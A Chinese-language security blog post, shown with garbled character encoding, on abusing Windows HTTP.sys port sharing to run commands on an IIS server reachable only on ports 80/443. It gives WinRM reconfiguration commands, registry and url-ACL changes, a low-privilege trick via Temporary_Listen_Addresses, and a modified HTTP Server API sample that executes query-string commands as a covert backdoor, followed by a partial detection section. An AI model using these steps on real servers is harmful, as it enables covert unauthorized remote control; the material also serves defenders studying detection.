I"¨R<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>æˆ‘æœ€è¿‘åœ¨æ€è€ƒè¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š</p>

<p>WindowsæœåŠ¡å™¨å¼€å¯äº†IISæœåŠ¡ï¼Œé˜²ç«å¢™ä»…å…è®¸80æˆ–443ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œé‚£ä¹ˆå¦‚ä½•åœ¨ä¸ä½¿ç”¨webshellçš„å‰æä¸‹ï¼Œå®ç°å¯¹è¯¥æœåŠ¡å™¨çš„è¿œç¨‹ç®¡ç†ï¼Ÿæ›´è¿›ä¸€æ­¥ï¼Œå¦‚æœåªæœ‰ä½æƒé™ï¼Œæœ‰æ²¡æœ‰åŠæ³•å‘¢ï¼Ÿ</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>HTTP.syså’Œç«¯å£å…±äº«</li>
  <li>WinRMæœåŠ¡</li>
  <li>HTTP Server API</li>
  <li>é’ˆå¯¹80å’Œ443ç«¯å£çš„åˆ©ç”¨æ–¹æ³•</li>
  <li>é’ˆå¯¹é«˜æƒé™å’Œä½æƒé™çš„åˆ©ç”¨æ–¹æ³•</li>
  <li>æ£€æµ‹æ–¹æ³•</li>
</ul>

<h2 id="0x02-åŸºæœ¬æ¦‚å¿µ">0x02 åŸºæœ¬æ¦‚å¿µ</h2>
<hr />

<h3 id="1httpsyså’Œç«¯å£å…±äº«">1.HTTP.syså’Œç«¯å£å…±äº«</h3>

<p>å¾®è½¯åœ¨Windows 2003 ServeråŠ å…¥äº†å†…æ ¸é©±åŠ¨ç¨‹åº(Http.sys)ï¼Œç”¨äºä¾¦å¬httpæµé‡å¹¶æ ¹æ®URLè¿›è¡Œå¤„ç†ï¼Œå…è®¸ä»»æ„ç”¨æˆ·è¿›ç¨‹å…±äº«ä¸“ç”¨äºHTTPæµé‡çš„TCPç«¯å£</p>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡HTTP.sysï¼Œå¤šä¸ªè¿›ç¨‹å°†èƒ½å¤Ÿä¾¦å¬åŒä¸€ç«¯å£ä¸Šçš„HTTPæµé‡</p>

<p>å¯ä»¥ä½¿ç”¨Netshå‘½ä»¤æ¥æŸ¥è¯¢å’Œé…ç½®HTTP.sysè®¾ç½®å’Œå‚æ•°ï¼Œå‚è€ƒèµ„æ–™å¦‚ä¸‹ï¼š</p>

<p>https://docs.microsoft.com/en-us/windows/win32/http/netsh-commands-for-http</p>

<p>åˆ—å‡ºæ‰€æœ‰URLçš„DACLï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http show urlacl
</code></pre></div></div>

<p>ç³»ç»Ÿé»˜è®¤åŒ…æ‹¬10ä¸ªDACLï¼Œå…¶ä¸­çš„ä¸¤ä¸ªå¯¹åº”WinRMæœåŠ¡ï¼Œå…·ä½“ä¿¡æ¯å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Reserved URL            : http://+:5985/wsman/
        User: NT SERVICE\WinRM
            Listen: Yes
            Delegate: No
        User: NT SERVICE\Wecsvc
            Listen: Yes
            Delegate: No
            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147
-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-299656351
7)

    Reserved URL            : https://+:5986/wsman/
        User: NT SERVICE\WinRM
            Listen: Yes
            Delegate: No
        User: NT SERVICE\Wecsvc
            Listen: Yes
            Delegate: No
            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147
-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-299656351
7)
</code></pre></div></div>

<p>5985å¯¹åº”httpçš„ç«¯å£ï¼Œ5986å¯¹åº”httpsçš„ç«¯å£</p>

<h3 id="2winrmæœåŠ¡">2.WinRMæœåŠ¡</h3>

<p>å­¦ä¹ èµ„æ–™ï¼š</p>

<p>https://docs.microsoft.com/en-us/windows/win32/winrm/portal</p>

<p>å…¨ç§°Windows Remote Managementï¼Œèƒ½å¤Ÿå®ç°åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤</p>

<h3 id="3http-server-api">3.HTTP Server API</h3>

<p>å­¦ä¹ èµ„æ–™ï¼š</p>

<p>https://docs.microsoft.com/en-us/windows/win32/http/http-api-start-page</p>

<p>HTTP Server APIä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿæ¥æ”¶å®šå‘åˆ°URLçš„HTTPè¯·æ±‚å¹¶å‘é€HTTPå“åº”</p>

<h2 id="0x03-åˆ©ç”¨winrmæœåŠ¡å®ç°ç«¯å£å¤ç”¨">0x03 åˆ©ç”¨WinRMæœåŠ¡å®ç°ç«¯å£å¤ç”¨</h2>
<hr />

<p><strong>æ³¨ï¼š</strong></p>

<p>Twi1ightçš„æ–‡ç« å·²ç»ä»‹ç»äº†è¿™éƒ¨åˆ†å†…å®¹ï¼Œæ„Ÿè°¢ä»–çš„åˆ†äº«ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://paper.seebug.org/1004/</p>

<p>æœ¬èŠ‚ä»…å¯¹æ­¤æ–‡ç« ä¸­çš„å†…å®¹è¿›è¡Œå½’çº³æ•´ç†å¹¶ç¨ä½œè¡¥å……</p>

<p>Windows Server 2008é»˜è®¤å…³é—­WinRMæœåŠ¡ï¼ŒWindows Server 2012é»˜è®¤å¼€å¯</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»¥ä¸‹æ“ä½œéœ€è¦è·å¾—ç®¡ç†å‘˜æƒé™</p>

<h3 id="1å¦‚æœç³»ç»Ÿå·²å¼€å¯winrmæœåŠ¡">1.å¦‚æœç³»ç»Ÿå·²å¼€å¯WinRMæœåŠ¡</h3>

<h4 id="1æŸ¥çœ‹ç›‘å¬é…ç½®">(1)æŸ¥çœ‹ç›‘å¬é…ç½®</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm e winrm/config/listener
</code></pre></div></div>

<p>é»˜è®¤ç›‘å¬5985ç«¯å£ï¼Œä¸ºäº†ä¸ä¿®æ”¹é»˜è®¤é…ç½®ï¼Œè¿™é‡Œéœ€è¦æ–°å¢80ç«¯å£</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æŸ¥çœ‹WinRMé…ç½®çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm get winrm/config
</code></pre></div></div>

<h4 id="2æ–°å¢80ç«¯å£">(2)æ–°å¢80ç«¯å£</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
</code></pre></div></div>

<p>è¡¥å……ï¼š</p>

<p>åˆ é™¤80ç«¯å£çš„å‘½ä»¤å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="false"}
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¦‚æœæœªæ–°å¢80ç«¯å£ï¼Œè¿œç¨‹è¿æ¥éœ€è¦æŒ‡å®š5985ç«¯å£ï¼Œç¤ºä¾‹å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129:5985 -u:test -p:1234 "whoami"
</code></pre></div></div>

<h4 id="3å…è®¸administratorsç»„ä¸­çš„æ‰€æœ‰å¸æˆ·è®¿é—®è¯¥æœåŠ¡">(3)å…è®¸Administratorsç»„ä¸­çš„æ‰€æœ‰å¸æˆ·è®¿é—®è¯¥æœåŠ¡</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¦‚æœä¸è®¾ç½®æ­¤é¡¹ï¼Œè¿œç¨‹è¿æ¥æ—¶åªèƒ½ä½¿ç”¨å†…ç½®ç®¡ç†å‘˜å¸æˆ·Administrator</p>

<h3 id="2å¦‚æœç³»ç»Ÿæœªå¼€å¯winrmæœåŠ¡">2.å¦‚æœç³»ç»Ÿæœªå¼€å¯WinRMæœåŠ¡</h3>

<h4 id="1ä½¿ç”¨é»˜è®¤é…ç½®å¼€å¯å¹¶é…ç½®æœåŠ¡">(1)ä½¿ç”¨é»˜è®¤é…ç½®å¼€å¯å¹¶é…ç½®æœåŠ¡</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Winrm quickconfig -q
</code></pre></div></div>

<p>å°†è‡ªåŠ¨æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>

<ul>
  <li>å¯åŠ¨WinRMæœåŠ¡ï¼Œå¹¶å°†æœåŠ¡å¯åŠ¨ç±»å‹è®¾ç½®ä¸ºè‡ªåŠ¨å¯åŠ¨</li>
  <li>æ·»åŠ ç›‘å¬é…ç½®</li>
  <li>æ·»åŠ é˜²ç«å¢™è§„åˆ™</li>
</ul>

<h4 id="2ä¿®æ”¹é»˜è®¤ç«¯å£">(2)ä¿®æ”¹é»˜è®¤ç«¯å£</h4>

<p>å¼€å¯æœåŠ¡åï¼Œé»˜è®¤ç›‘å¬5985ç«¯å£ï¼Œä¸ºäº†æ›´éšè”½ï¼Œè¿™é‡Œéœ€è¦å°†é»˜è®¤ç«¯å£5985ä¿®æ”¹ä¸º80ç«¯å£</p>

<p>ä¿®æ”¹httpé»˜è®¤ç«¯å£ä¸º80ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¿˜åŸhttpé»˜è®¤ç«¯å£ä¸º5985çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="5985"}
</code></pre></div></div>

<h4 id="3å…è®¸administratorsç»„ä¸­çš„æ‰€æœ‰å¸æˆ·è®¿é—®è¯¥æœåŠ¡-1">(3)å…è®¸Administratorsç»„ä¸­çš„æ‰€æœ‰å¸æˆ·è®¿é—®è¯¥æœåŠ¡</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¦‚æœä¸è®¾ç½®æ­¤é¡¹ï¼Œè¿œç¨‹è¿æ¥æ—¶åªèƒ½ä½¿ç”¨å†…ç½®ç®¡ç†å‘˜å¸æˆ·Administrator</p>

<h3 id="3é€šè¿‡winrmæœåŠ¡è¿æ¥è¿œç¨‹ä¸»æœº">3.é€šè¿‡WinRMæœåŠ¡è¿æ¥è¿œç¨‹ä¸»æœº</h3>

<p>æœ¬åœ°ç³»ç»Ÿéœ€è¦ä½¿ç”¨åŒè¿œç¨‹ä¸»æœºç›¸åŒçš„è¯­è¨€ç¯å¢ƒ</p>

<h4 id="1æœ¬åœ°ç³»ç»Ÿå¼€å¯winrmæœåŠ¡">(1)æœ¬åœ°ç³»ç»Ÿå¼€å¯WinRMæœåŠ¡</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Winrm quickconfig -q
</code></pre></div></div>

<h4 id="2æœ¬åœ°ç³»ç»Ÿè®¾ç½®è®¿é—®è§„åˆ™å…è®¸è¿æ¥æ‰€æœ‰ä¸»æœº">(2)æœ¬åœ°ç³»ç»Ÿè®¾ç½®è®¿é—®è§„åˆ™ï¼Œå…è®¸è¿æ¥æ‰€æœ‰ä¸»æœº</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Client @{TrustedHosts="*"}
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>åˆ é™¤è¯¥è®¿é—®è§„åˆ™çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Client @{TrustedHosts=""}
</code></pre></div></div>

<h4 id="3è¿æ¥è¿œç¨‹ä¸»æœºçš„å‘½ä»¤ç¤ºä¾‹">(3)è¿æ¥è¿œç¨‹ä¸»æœºçš„å‘½ä»¤ç¤ºä¾‹</h4>

<p>å¦‚æœä¸ºé»˜è®¤5985ç«¯å£ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129:5985 -u:administrator -p:1234 "whoami"
</code></pre></div></div>

<p>å¦‚æœä¸º80ç«¯å£ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129 -u:administrator -p:1234 "whoami"
</code></pre></div></div>

<h2 id="0x04-åˆ©ç”¨http-server-apiå®ç°ç«¯å£å¤ç”¨">0x04 åˆ©ç”¨HTTP Server APIå®ç°ç«¯å£å¤ç”¨</h2>
<hr />

<h3 id="1ç¤ºä¾‹ä»£ç æµ‹è¯•">1.ç¤ºä¾‹ä»£ç æµ‹è¯•</h3>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://docs.microsoft.com/en-us/windows/win32/http/http-server-sample-application</p>

<p>ä»£ç æ”¯æŒåŒæ—¶æ³¨å†Œå¤šä¸ªURLï¼Œå¤„ç†è¯·æ±‚ï¼Œå‘é€HTTPå“åº”</p>

<p>ç®€å•æµ‹è¯•å¦‚ä¸‹ï¼š</p>

<p>æœåŠ¡å™¨IPä¸º192.168.112.129</p>

<p>ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/MyUri1 http://+:80/MyUri2
</code></pre></div></div>

<p>æ‰“å¼€æµè§ˆå™¨åˆ†åˆ«è®¿é—®http://192.168.112.129:80/MyUri1å’Œhttp://192.168.112.129:80/MyUri2</p>

<p>æ¥æ”¶çš„ç»“æœå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/3-1.png" alt="Alt text" /></p>

<p>ç¤ºä¾‹ä»£ç é€šè¿‡API HttpAddUrl()å°†URLæ³¨å†Œä¸ºListen Onï¼Œé»˜è®¤é…ç½®ä¸‹ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½æ·»åŠ æˆåŠŸï¼Œå¦åˆ™äº§ç”Ÿé”™è¯¯ï¼šHttpAddUrl failed with 5ï¼Œæç¤ºæƒé™ä¸å¤Ÿ</p>

<p>ä½†å¯ä»¥é€šè¿‡æ·»åŠ url acl(éœ€è¦ç®¡ç†å‘˜æƒé™)çš„æ–¹å¼å®ç°æ™®é€šç”¨æˆ·æƒé™ä¸‹çš„æ­£å¸¸è¿è¡Œ</p>

<h3 id="2é€šè¿‡æ·»åŠ url-acléœ€è¦ç®¡ç†å‘˜æƒé™çš„æ–¹å¼å®ç°ç¤ºä¾‹ä»£ç ä»¥æ™®é€šç”¨æˆ·æƒé™è¿è¡Œ">2.é€šè¿‡æ·»åŠ url acl(éœ€è¦ç®¡ç†å‘˜æƒé™)çš„æ–¹å¼å®ç°ç¤ºä¾‹ä»£ç ä»¥æ™®é€šç”¨æˆ·æƒé™è¿è¡Œ</h3>

<p>æ–¹æ³•å¦‚ä¸‹:</p>

<p>æ·»åŠ url aclï¼ŒæˆäºˆEveryoneç”¨æˆ·å¯¹æŒ‡å®šURLçš„æƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹(ç®¡ç†å‘˜æƒé™):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http add urlacl url=http://+:80/MyUri user=everyone
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>åˆ é™¤è¯¥url aclçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http delete urlacl url=http://+:80/MyUri
</code></pre></div></div>

<p>å†æ¬¡æ‰§è¡Œæµ‹è¯•ç¨‹åº(æ™®é€šç”¨æˆ·æƒé™)ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/MyUri
</code></pre></div></div>

<p>æ‰§è¡ŒæˆåŠŸ</p>

<h3 id="3å€ŸåŠ©å·²æœ‰çš„url-aclå®ç°ç¤ºä¾‹ä»£ç ä»¥æ™®é€šç”¨æˆ·æƒé™è¿è¡Œ">3.å€ŸåŠ©å·²æœ‰çš„url aclå®ç°ç¤ºä¾‹ä»£ç ä»¥æ™®é€šç”¨æˆ·æƒé™è¿è¡Œ</h3>

<p>åˆ—å‡ºæ‰€æœ‰URLçš„DACLï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http show urlacl
</code></pre></div></div>

<p>æ³¨æ„åˆ°é»˜è®¤é…ç½®ä¸‹åŒ…å«ä»¥ä¸‹aclï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Reserved URL            : http://+:80/Temporary_Listen_Addresses/
       User: \Everyone
           Listen: Yes
           Delegate: No
           SDDL: D:(A;;GX;;;WD)
</code></pre></div></div>

<p>Userä¸ºEveryoneï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªurl</p>

<p>æ‰§è¡Œç¤ºä¾‹ç¨‹åº(æ™®é€šç”¨æˆ·æƒé™)ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/Temporary_Listen_Addresses/MyUri
</code></pre></div></div>

<p>æ‰§è¡ŒæˆåŠŸ</p>

<h3 id="4ä¿®æ”¹ç¤ºä¾‹ä»£ç å®ç°å‘½ä»¤æ‰§è¡Œ">4.ä¿®æ”¹ç¤ºä¾‹ä»£ç ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ</h3>

<p>æ€è·¯å¦‚ä¸‹ï¼š</p>

<p>é€šè¿‡GETè¯·æ±‚å‘é€è¦æ‰§è¡Œçš„cmdå‘½ä»¤ï¼Œæ ¼å¼ä¸º<code class="language-plaintext highlighter-rouge">?&lt;command&gt;</code></p>

<p>ä¾‹å¦‚:http://192.168.112.129/MyUri?whoamiï¼Œè¦æ‰§è¡Œçš„å‘½ä»¤ä¸ºwhoamiï¼Œåœ¨Responseä¸­å›å¤æ‰§è¡Œçš„ç»“æœ</p>

<p>å¯¹äºä¸ç¬¦åˆæ ¼å¼çš„GETå’ŒPOSTè¯·æ±‚ï¼Œåœ¨Responseä¸­å›å¤404</p>

<p>å®ç°ä»£ç ï¼š</p>

<p>ä»¥ç¤ºä¾‹ç¨‹åºä¸ºæ¨¡æ¿ï¼Œéœ€è¦ä¿®æ”¹ä»¥ä¸‹ä½ç½®ï¼š</p>

<h4 id="1ä½¿ç”¨ä¼ å…¥å‚æ•°">(1)ä½¿ç”¨?ä¼ å…¥å‚æ•°</h4>

<p><code class="language-plaintext highlighter-rouge">pRequest-&gt;CookedUrl.pQueryString</code>èƒ½å¤Ÿè¯»å–å‚æ•°ï¼Œä½†åŒ…æ‹¬äº†æ— ç”¨çš„å­—ç¬¦<code class="language-plaintext highlighter-rouge">?</code>ï¼Œå®é™…æ‰§è¡Œå‘½ä»¤æ—¶éœ€è¦å»æ‰<code class="language-plaintext highlighter-rouge">pRequest-&gt;CookedUrl.pQueryString</code>çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p>

<p>å»æ‰pRequest-&gt;CookedUrl.pQueryStringç¬¬ä¸€ä¸ªå­—ç¬¦çš„Cä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WCHAR *QueryString = new WCHAR[pRequest-&gt;CookedUrl.QueryStringLength-1];
wcsncpy_s(QueryString, wcslen(QueryString), pRequest-&gt;CookedUrl.pQueryString + 1, wcslen(QueryString) - 1);
wprintf_s(L"%s\n", QueryString);
</code></pre></div></div>

<h4 id="2ç‰¹æ®Šå­—ç¬¦çš„æ›¿æ¢">(2)ç‰¹æ®Šå­—ç¬¦çš„æ›¿æ¢</h4>

<ul>
  <li>ç©ºæ ¼è¢«è½¬ç ä¸º%20</li>
  <li>â€œè¢«è½¬ç ä¸º%22</li>
  <li>â€˜è¢«è½¬ç ä¸º%27</li>
</ul>

<p>ä¾‹å¦‚æµè§ˆå™¨è¾“å…¥å­—ç¬¦ä¸²<code class="language-plaintext highlighter-rouge">whoami /all</code>ï¼Œä¼šè¢«è½¬ç ä¸º<code class="language-plaintext highlighter-rouge">whoami%20/all</code>ï¼Œè¿™æ¡å‘½ä»¤æ— æ³•ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸‹æ‰§è¡Œ</p>

<p>è¿˜åŸURLç¼–ç çš„Cä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/UrlDecode.cpp</p>

<p>ä»£ç æ”¯æŒå¤šå­—èŠ‚å­—ç¬¦é›†å’ŒUnicodeå­—ç¬¦é›†</p>

<h4 id="3ä½¿ç”¨ç®¡é“è¯»å…¥å‘½ä»¤å¹¶æ‰§è¡Œå›ä¼ ç»“æœ">(3)ä½¿ç”¨ç®¡é“è¯»å…¥å‘½ä»¤å¹¶æ‰§è¡Œï¼Œå›ä¼ ç»“æœ</h4>

<p>ä½¿ç”¨ç®¡é“æ‰§è¡Œcmdå‘½ä»¤å¹¶è·å–ç»“æœçš„ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp</p>

<h4 id="4ä¿®æ”¹å›ä¼ ç»“æœçš„æ ¼å¼">(4)ä¿®æ”¹å›ä¼ ç»“æœçš„æ ¼å¼</h4>

<p>å›ä¼ çš„ç»“æœéœ€è¦ä½œæ ¼å¼è½¬æ¢ï¼Œ<code class="language-plaintext highlighter-rouge">\n</code>æ¢è¡Œç¬¦è½¬æ¢æˆhtmlä¸­çš„<code class="language-plaintext highlighter-rouge">&lt;/br&gt;</code>ï¼Œå¦åˆ™æµè§ˆå™¨æ˜¾ç¤ºçš„å†…å®¹æ— æ³•æ¢è¡Œ</p>

<p>å°†æ–‡æœ¬ä¸­çš„æ¢è¡Œç¬¦(<code class="language-plaintext highlighter-rouge">\n</code>)è½¬æ¢æˆhtmlä¸­æ¢è¡Œç¬¦(<code class="language-plaintext highlighter-rouge">&lt;/br&gt;</code>)çš„ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/TextToHtmlofNewline.cpp</p>

<p>æœ€ç»ˆå®ç°çš„ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/HTTPServerWebshell.cpp</p>

<p>åªæœ‰è¾“å…¥ç‰¹å®šæ ¼å¼çš„urlèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå¦åˆ™æç¤º404</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-1.png" alt="Alt text" /></p>

<p>å‘½ä»¤å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.112.129/MyUri?net%20start
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-2.png" alt="Alt text" /></p>

<p>httpsåè®®ä¹Ÿæ”¯æŒï¼Œå‘½ä»¤å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.112.129/MyUri?net%20start
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-3.png" alt="Alt text" /></p>

<h2 id="0x05-åˆ©ç”¨æ–¹æ³•">0x05 åˆ©ç”¨æ–¹æ³•</h2>
<hr />

<p>WindowsæœåŠ¡å™¨å¼€å¯äº†IISæœåŠ¡ï¼Œé˜²ç«å¢™ä»…å…è®¸80æˆ–443ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œåœ¨ä¸ä½¿ç”¨webshellçš„å‰æä¸‹ï¼Œå®ç°å¯¹è¯¥æœåŠ¡å™¨è¿œç¨‹ç®¡ç†çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p>

<h3 id="1ä½¿ç”¨ç®¡ç†å‘˜æƒé™">1.ä½¿ç”¨ç®¡ç†å‘˜æƒé™</h3>

<h4 id="1ä½¿ç”¨winrmæœåŠ¡">(1)ä½¿ç”¨WinRMæœåŠ¡</h4>

<p>éœ€è¦å¼€å¯WinRMæœåŠ¡</p>

<p>éœ€è¦Administratorsç»„ä¸­çš„å¸æˆ·å£ä»¤æˆ–hash</p>

<h4 id="2ä½¿ç”¨http-server-api">(2)ä½¿ç”¨HTTP Server API</h4>

<p>å¯ä»¥ä½¿ç”¨ä»»æ„url</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>80å’Œ443ç«¯å£éƒ½å¯ä»¥</p>

<h3 id="2ä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™">2.ä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™</h3>

<h4 id="1ä½¿ç”¨http-server-api">(1)ä½¿ç”¨HTTP Server API</h4>

<p>ä½¿ç”¨å·²æœ‰çš„url aclï¼šhttp://+:80/Temporary_Listen_Addresses/</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ— æ³•ä½¿ç”¨443ç«¯å£</p>

<h2 id="0x06-æ£€æµ‹æ–¹æ³•">0x06 æ£€æµ‹æ–¹æ³•</h2>
<hr />

<p>ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ£€æµ‹å½“å‰IISæœåŠ¡å™¨çš„ç«¯å£å…±äº«åŠŸèƒ½æ˜¯å¦è¢«æ»¥ç”¨</p>

<h3 id="1æ£€æµ‹æ­£åœ¨ä½¿ç”¨çš„url">1.æ£€æµ‹æ­£åœ¨ä½¿ç”¨çš„url</h3>

<p>å¦‚æœä½¿ç”¨äº†HTTP Server APIï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šæ³¨å†Œurlï¼ŒæŸ¥çœ‹å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http sh ser
</code></pre></div></div>

<p>å¯ç–‘ç»“æœç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server session ID: D000000020000174
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: AC0000004000017C
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTP://192.168.112.129:80:192.168.112.129/MYURI/

Server session ID: D000000020000173
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: AC0000004000017B
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTPS://192.168.112.129:443:192.168.112.129/MYURI/
                
Server session ID: D600000020000077
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
